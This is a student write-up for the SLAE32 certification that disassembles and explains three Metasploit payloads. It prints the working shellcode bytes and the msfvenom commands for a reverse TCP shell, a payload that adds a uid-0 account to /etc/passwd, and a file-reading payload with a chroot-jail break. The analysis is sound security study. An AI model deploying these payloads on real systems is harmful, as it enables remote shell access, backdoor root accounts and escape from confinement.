---
layout: page
title: SLAE32 Assignment 5
---

<div class="well" markdown="1">
<h2>SLAE32 Assignment 5: Analysis</h2>

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-1009

Take three payload samples from msfpayload
analyze using ndisasm, libemu, gdb
present analysis

My first thought was to analyze at least one meterpreter shellcode. Alas, they are enormous and I would like to do more with the rest of my life instead of analyzing almost 1MB of shellcode. So instead, I opted for shorter ones. First, I wanted to look at their reverse tcp shellcode. I managed to get mine into 100 bytes, but the Metasploit one is 68 bytes, so I really wanted to see their approach on that one. Second, I wanted to look at their implementation of adduser. For the last one, I had noticed in viewing the payload options that they all had some extra options and one that intrigued me was PrependChrootBreak. I was not sure off the top of my head how they would do that and so I thought that would go well with the read_file shellcode.

<h2>Reverse TCP</h2>
First the shellcode itself:
```
$ msfvenom -p linux/x86/shell_reverse_tcp -f c LHOST=192.168.1.1 LPORT=9999
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x01\x68"
"\x02\x00\x27\x0f\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```
The first thing I did was run it through `ndisasm` to view the assembly code.  

```nasm
$ msfvenom -p linux/x86/shell_reverse_tcp -f raw LHOST=192.168.1.1 LPORT=9999 | ndisasm -u -
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes

00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  93                xchg eax,ebx
00000010  59                pop ecx
00000011  B03F              mov al,0x3f
00000013  CD80              int 0x80
00000015  49                dec ecx
00000016  79F9              jns 0x11
00000018  68C0A80101        push dword 0x101a8c0
0000001D  680200270F        push dword 0xf270002
00000022  89E1              mov ecx,esp
00000024  B066              mov al,0x66
00000026  50                push eax
00000027  51                push ecx
00000028  53                push ebx
00000029  B303              mov bl,0x3
0000002B  89E1              mov ecx,esp
0000002D  CD80              int 0x80
0000002F  52                push edx
00000030  686E2F7368        push dword 0x68732f6e
00000035  682F2F6269        push dword 0x69622f2f
0000003A  89E3              mov ebx,esp
0000003C  52                push edx
0000003D  53                push ebx
0000003E  89E1              mov ecx,esp
00000040  B00B              mov al,0xb
00000042  CD80              int 0x80
```

Static Analysis:
It looks like it is first calling int 0x80 with 0x66 (102) as the syscall type. I recall from the reverse tcp shellcode that is the socketcall syscall. This can be seen in `/usr/include/i386-linux-gnu/asm/unistd_32.h`
```c
#define __NR_socketcall 102
```
The parameters for socketcall are the socketcall type in ebx, and a pointer the to args in ecx. It looks like $ebx is 1 and $ecx points to 2, 1, 0.

The socketcall type is socket, as seen in `/usr/include/libr/sflib/common/sfsocketcall.h`:
```c
#define SYS_socket      1               /* sys_socket(2)                */
```

The argument 2 means AF_INET socket, as seen in `/usr/include/i386-linux-gnu/bits/socket.h`:
```c
#define PF_INET         2       /* IP protocol family.  */
```

The argument 1 means SOCK_STREAM, as seen in `/usr/include/i386-linux-gnu/bits/socket_type.h`:
```c
enum __socket_type
{
  SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based
                                   byte streams.  */
#define SOCK_STREAM SOCK_STREAM
```
The last argument to socket is 0, which is IPPROTO_TCP, as seen in `/usr/include/netinet/in.h`:
```c
IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
```
So unsurprisingly, it creates a socket. The next step that it does is call syscall 0x3f (63). This is dup2:
```c
#define __NR_dup2 63
```
In the setup to this call, it exchanges $eax and $ebx. The value of $eax was the file descriptor of the socket that was just opened. The next instruction is `pop ecx`. The last thing that was pushed onto the stack was 0x2. So ecx is set to 2. So that means that it copies the socket file descriptor over STDERR. It then decrements ecx, and calls `jns 0x11`, although examining the opcode, the offset is 0xf9, meaning -7, that is to the `mov al,0x3f` instruction, 3 instructions before. The `dec` instruction will set the sign flag if the result is negative, and the `jns` jumps if the sign flag is not set. So what happens is that the loop continues for ecx = 2, 1, and 0. That means that this part of the code will loop and duplicate the socket file descriptor over STDERR, STDOUT, and STDIN.

In the next block, it pretty clearly is pushing the arguments for the socket connect call. The two dwords that it pushes are the sockaddr_in structure, with the family (2), port (0x270f for port 9999), and the ip address (0x0101a8c0 for 192.168.1.1). Once the socket call is made, it clearly calls execve with the arguments for /bin/sh. At this point, I have seen it and written it enough that it is pretty evident.

This static analysis is supported by both gdb and libemu.

I ran it in libemu, and this is the result at the bottom of the output:

```c
$ cat reverse_tcp_raw | sctest -vvv -Ss 10000
....
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
int dup2 (
     int oldfd = 14;
     int newfd = 2;
) =  2;
int dup2 (
     int oldfd = 14;
     int newfd = 1;
) =  1;
int dup2 (
     int oldfd = 14;
     int newfd = 0;
) =  0;
int connect (
     int sockfd = 14;
     struct sockaddr_in * serv_addr = 0x00416fbe =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 3879 (port=9999);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 16885952 (host=192.168.1.1);
             };
             char sin_zero = "       ";
         };
     int addrlen = 102;
) =  0;
int execve (
     const char * dateiname = 0x00416fa6 =>
           = "//bin/sh";
     const char * argv[] = [
           = 0x00416f9e =>
               = 0x00416fa6 =>
                   = "//bin/sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
```

In GDB, finding entry point took a little extra work, as this elf has the minimal amount of information possible. Commands like `info file` in gdb give no information at all. So the way to find the entry point is with the command readelf:
```
$ readelf -h reverse_tcp
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048054
  Start of program headers:          52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         1
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
```
We can see from here that the entry point is 0x8048054, so we can now load it up into gdb and set a breakpoint for that address and run it. I did have to regenerate it at this point, as I had originally forgotten to change the IP address to 127.0.0.1. With that change made to the executable, I was able to fully test it. However, it did not really add too much to the analysis that I already did up to this point. It did confirm, however, what I already learned.


<h2>Add User</h2>
Next up is add user. First the shellcode:
```
$ msfvenom -p linux/x86/adduser -f c USER=assembly PASS=you_slae_me SHELL=/bin/bash
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Final size of c file: 433 bytes
unsigned char buf[] =
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x28\x00\x00\x00\x61\x73"
"\x73\x65\x6d\x62\x6c\x79\x3a\x41\x7a\x70\x2f\x76\x6c\x31\x33"
"\x44\x38\x69\x71\x67\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62"
"\x69\x6e\x2f\x62\x61\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58"
"\xcd\x80\x6a\x01\x58\xcd\x80";
```
Again, first the disassembly.
```nasm
$ cat add_user_raw | ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  89CB              mov ebx,ecx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A05              push byte +0x5
0000000B  58                pop eax
0000000C  31C9              xor ecx,ecx
0000000E  51                push ecx
0000000F  6873737764        push dword 0x64777373
00000014  682F2F7061        push dword 0x61702f2f
00000019  682F657463        push dword 0x6374652f
0000001E  89E3              mov ebx,esp
00000020  41                inc ecx
00000021  B504              mov ch,0x4
00000023  CD80              int 0x80
00000025  93                xchg eax,ebx
00000026  E828000000        call 0x53
0000002B  61                popa
0000002C  7373              jnc 0xa1
0000002E  656D              gs insd
00000030  626C793A          bound ebp,[ecx+edi*2+0x3a]
00000034  41                inc ecx
00000035  7A70              jpe 0xa7
00000037  2F                das
00000038  766C              jna 0xa6
0000003A  3133              xor [ebx],esi
0000003C  44                inc esp
0000003D  386971            cmp [ecx+0x71],ch
00000040  673A30            cmp dh,[bx+si]
00000043  3A30              cmp dh,[eax]
00000045  3A3A              cmp bh,[edx]
00000047  2F                das
00000048  3A2F              cmp ch,[edi]
0000004A  62696E            bound ebp,[ecx+0x6e]
0000004D  2F                das
0000004E  626173            bound esp,[ecx+0x73]
00000051  680A598B51        push dword 0x518b590a
00000056  FC                cld
00000057  6A04              push byte +0x4
00000059  58                pop eax
0000005A  CD80              int 0x80
0000005C  6A01              push byte +0x1
0000005E  58                pop eax
0000005F  CD80              int 0x80
```
Again we have a series of syscalls. The first one is type 0x46 (70) which is
```
#define __NR_setreuid 70
```
The arguments in ebx and ecx are both 0, meaning it is setting the real and effective uid to root.

The next syscall it makes is syscall 5, open.
```
#define __NR_open 5
```
It then pushes a null terminated string for "/etc//passwd". The address to this string is put in ebx. ecx was 0, then it is incremented and then 0x4 is moved into ch, which would give it a value of 0x401 or 1025 (I verified this in gdb, by starting it with a random executable, breaking at _start and running it so it had registers, then did `set $ch=0x4` and `set $cl=0x1`). A quick look at `/usr/include/asm-generic/fcntl.h` shows the the 0x400 is for `O_NOCTTY` and the 0x1 is for O_WRONLY (as an aside the way I can find these definitions is with the following command, with whatever tag I am looking for: `grep -r O_CREAT /usr/include/*`).
```
#define O_WRONLY        00000001
#define O_NOCTTY        00000400        /* not fcntl */
```
A look at `man 2 open` shows that `O_NOCTTY` prevents the open from opening a tty and having it control the process:
```
O_NOCTTY
       If pathname refers to a terminal device—see tty(4)—it will not become the process's controlling terminal even if the process
       does not have one.
```
It then exchanges eax and ebx, to put the file descriptor into ebx for the next syscall. It then calls 0x53, which is in the middle of an instruction that ndisasm produced. So lets redo it, skipping over everything up to that point.
```nasm
$ cat add_user_raw | ndisasm -u -e 0x53 -
00000000  59                pop ecx
00000001  8B51FC            mov edx,[ecx-0x4]
00000004  6A04              push byte +0x4
00000006  58                pop eax
00000007  CD80              int 0x80
00000009  6A01              push byte +0x1
0000000B  58                pop eax
0000000C  CD80              int 0x80
```
What that did was put the address after the call on the stack, which if you look at the bytes, they are all ASCII, and so it would appear that they are. We can see the contents with the string command:
```
$ strings add_user_elf
Qhsswdh//pah/etc
assembly:Azp/vl13D8iqg:0:0::/:/bin/bash
```
So with that string on the stack, it pops ecx, which puts the address of the string into ecx. It moves ecx - 4 into edx. It pushes 4 onto the stack then pops that value into eax, which is the value for the write syscall:
```
#define __NR_write 4
```
It is not immediately clear to me from just reading the assembly what the value of edx will be from the `mov edx, [ecx-4]` instruction. I assume it is the length of the string, as that is what the write call requires. It then makes the syscall, and the final three instructions simply exit, as the value 0x1 refers to the `exit` syscall.


Having examined the code and getting a good understanding of what it does, I now feel comfortable testing it with libemu and gdb, which require that I run it as root, since it writes to the /etc/passwd file. First, lets run it through libemu and sctest.

sctest doesn't appear to give much information. It isn't printing the syscall list as it did before. Running it through gdb revealed to me how edx contained the length of the passwd entry. I stepped it to the point that it was about to load edx:

{% include image name="adduser_gdb1.png" width="100%" %}

As you can see, the address of the passwd file entry is in 0x804807f, which means the value loaded into edx is 0x804807f - 0x4 = 0x804807b. This does indeed contain the length:
```
gdb-peda$ x /4xb 0x804807b
0x804807b:	0x28	0x00	0x00	0x00
```
But why? Looking just one more byte show us the reason.
```
gdb-peda$ x /5xb 0x804807a
    0x804807a:	0xe8	0x28	0x00	0x00	0x00
gdb-peda$ x /i 0x804807a
    0x804807a:	call   0x80480a7
```
Of course! It is the instruction that calls the rest of the shellcode and the offset in the instruction jumps over the passwd entry. That offset is, of course, also the length of the string. A very clever reuse of information in the shellcode. This is truly a beautiful piece of shellcode.


<h2>Read File</h2>
```
$ msfvenom -p linux/x86/read_file -f c  PrependChrootBreak=true PATH=./secret_file
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 123 bytes
Final size of c file: 543 bytes
unsigned char buf[] =
"\x31\xc9\x31\xdb\x6a\x46\x58\xcd\x80\x6a\x3d\x89\xe3\x6a\x27"
"\x58\xcd\x80\x89\xd9\x58\xcd\x80\x31\xc0\x50\x66\x68\x2e\x2e"
"\x89\xe3\x6a\x3d\x59\xb0\x0c\xcd\x80\xe2\xfa\x6a\x3d\x89\xd9"
"\x58\xcd\x80\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80"
"\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00"
"\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00"
"\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8"
"\xc5\xff\xff\xff\x2e\x2f\x73\x65\x63\x72\x65\x74\x5f\x66\x69"
"\x6c\x65\x00";
```

First, let's look at the assembly:
```nasm
$ cat read_file_raw | ndisasm -u -
00000000  31C9              xor ecx,ecx
00000002  31DB              xor ebx,ebx
00000004  6A46              push byte +0x46
00000006  58                pop eax
00000007  CD80              int 0x80
```
First syscall is for call 0x46 (70) which is setreuid again.
```nasm
00000009  6A3D              push byte +0x3d
0000000B  89E3              mov ebx,esp
0000000D  6A27              push byte +0x27
0000000F  58                pop eax
00000010  CD80              int 0x80
```
The next syscall is for 0x27 (39) which is for mkdir.
```
#define __NR_mkdir 39
```
ecx is already set to 0, which serves for the mode. The second parameter is set to the address of the value 0x3d. which is '=' in ASCII.
```nasm
00000012  89D9              mov ecx,ebx
00000014  58                pop eax
00000015  CD80              int 0x80
```
The next syscall has a number 0x3d (which it pops from the stack, the last thing that should be on the stack is left from when it pushed '='). ebx is still pointing to the '=' string, which it copies into ecx. System call 0x3d (61) is chroot:
```
#define __NR_chroot 61
```
```nasm
00000017  31C0              xor eax,eax
00000019  50                push eax
0000001A  66682E2E          push word 0x2e2e
0000001E  89E3              mov ebx,esp
00000020  6A3D              push byte +0x3d
00000022  59                pop ecx
00000023  B00C              mov al,0xc
00000025  CD80              int 0x80
00000027  E2FA              loop 0x23
```
At this point, it pushes the null terminated string '..' onto the stack. It puts the address for this string into ebx, and puts the value 0x3d into ecx. It then sets eax to 0xc (12) and calls int 0x80. Syscall 0xc is chdir:
```
#define __NR_chdir 12
```
It loops back to call chdir again. Since ecx was set to 0x3d, it will loop that many times, calling `chdir ..`. This is the chroot break that we prepended. This is essentially straight from the chroot man page.
```
This call does not change the current working directory, so that after the call '.' can be outside the tree rooted at '/'.  In particular, the superuser can escape from a "chroot jail" by doing:

    mkdir foo; chroot foo; cd ..
```
This is precisely what it is doing.



```nasm
00000029  6A3D              push byte +0x3d
0000002B  89D9              mov ecx,ebx
0000002D  58                pop eax
0000002E  CD80              int 0x80
```
It finishes the chroot calls with one final call to chroot with '..' as the argument.

```nasm
00000030  EB36              jmp short 0x68
00000032  B805000000        mov eax,0x5
00000037  5B                pop ebx
00000038  31C9              xor ecx,ecx
0000003A  CD80              int 0x80
```
Now it jumps to 0x68, which is located at the end of the shellcode. This is part of the jump-call-pop. This jump goes directly to a call, which calls back to the line just after the jmp. The data at the end is simply the file path that we are trying to read. The address of this file path is put into ebx, ecx is set to 0, and eax is set to 0x5, which is for syscall 5, which is open.
```
#define __NR_open 5
```



```nasm
0000003C  89C3              mov ebx,eax
0000003E  B803000000        mov eax,0x3
00000043  89E7              mov edi,esp
00000045  89F9              mov ecx,edi
00000047  BA00100000        mov edx,0x1000
0000004C  CD80              int 0x80
```
Next, it moves the file descriptor into ebx, puts 3 into eax (for syscall 3 which is read):
```
#define __NR_read 3
```
It moves the stack pointer into ecx (by way of edi) and puts 0x1000 iunto edx for the length. So it will read at most 0x1000 bytes onto the stack at the current stack position.

```nasm
0000004E  89C2              mov edx,eax
00000050  B804000000        mov eax,0x4
00000055  BB01000000        mov ebx,0x1
0000005A  CD80              int 0x80
```
Next it calls syscall 4 (write). ebx is set to 1, which means it will write to STDOUT. ecx is still get to the stack pointer, where the data was read. edx is set to what eax was after the read call finished, which is the number of bytes read. So it will write the contents of the file (however much it read) to STDOUT.

```nasm
0000005C  B801000000        mov eax,0x1
00000061  BB00000000        mov ebx,0x0
00000066  CD80              int 0x80
```
And it finishes with a graceful exit. How nice.

The remainder of the code below simply contains the file path data and the associated call for the jmp-call-pop.
```nasm
00000068  E8C5FFFFFF        call 0x32
0000006D  2E2F              cs das
0000006F  7365              jnc 0xd6
00000071  637265            arpl [edx+0x65],si
00000074  745F              jz 0xd5
00000076  66                o16
00000077  69                db 0x69
00000078  6C                insb
00000079  65                gs
0000007A  00                db 0x00
```

So it seems pretty straightforward. For the Chroot Break, it makes a directory and then chroots to it and then changes the directory to `..`.  It loops over this several times in order to ensure breaking out to the root of the filesystem. Then it simply opens the file, reads the contents, and writes it to stdout.

This also doesn't run well in sctest. I assume that it is due to the setreuid function. However, we can run it in gdb to verify that it works as described above.

Running it in gdb confirmed the above analysis. It didn't really add anything to the understanding, so I don't cover it here. However, one thing that was evident that is worth noting, is that when I ran it, it failed to read the file. This was due to the Chroot break, as it changed the working directory, and the file that I had it read was specified with a relative path, which was no longer valid at the time of the open. This can be seen in the following screenshot from the gdb session, which shows the current working directory just before it calls open.

{% include image name="readfile_gdb_pwd.png" width="100%" %}

So there it is. Three payloads from Metasploit analyzed as naseum. :) Frankly, the shellcode from Metasploit is very compact and the way it reuses data and compresses the instructions is quite amazing. It is truly a work of art, in my opinion. I am inspired to look at the Metasploit payload generators to see what it looks like, and how I can add my shellcode and encoders and crypters into metasploit. 
